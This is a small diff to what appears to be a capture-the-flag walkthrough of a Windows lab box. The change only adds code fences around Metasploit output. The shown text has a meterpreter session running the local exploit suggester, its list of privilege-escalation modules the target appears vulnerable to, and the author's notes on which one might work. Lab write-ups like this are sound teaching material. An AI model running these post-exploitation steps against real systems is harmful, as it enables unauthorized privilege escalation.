@@ -307,7 +307,7 @@ Meterpreter : x86/windows
 Now that we have a meterpreter shell we can use exploit suggester for possible privilege scalation on the windows box.  
 
 meterpreter > run post/multi/recon/local_exploit_suggester
-
+```
 [*] 10.10.10.9 — Collecting local exploits for x86/windows…
 [*] 10.10.10.9–37 exploit checks are being tried…
 [+] 10.10.10.9 — exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
@@ -319,7 +319,7 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 [+] 10.10.10.9 — exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
 [+] 10.10.10.9 — exploit/windows/local/ms_ndproxy: The target service is running, but could not be validated.
 [+] 10.10.10.9 — exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
-
+```
 We got quite a few exploits we could use but only one of them looks promising, ms16_032_secondary logon_handle_privesc. 
 I tried it but that exploit only works if another user logged in as Administrator and in this case no one was logging in.
 ```
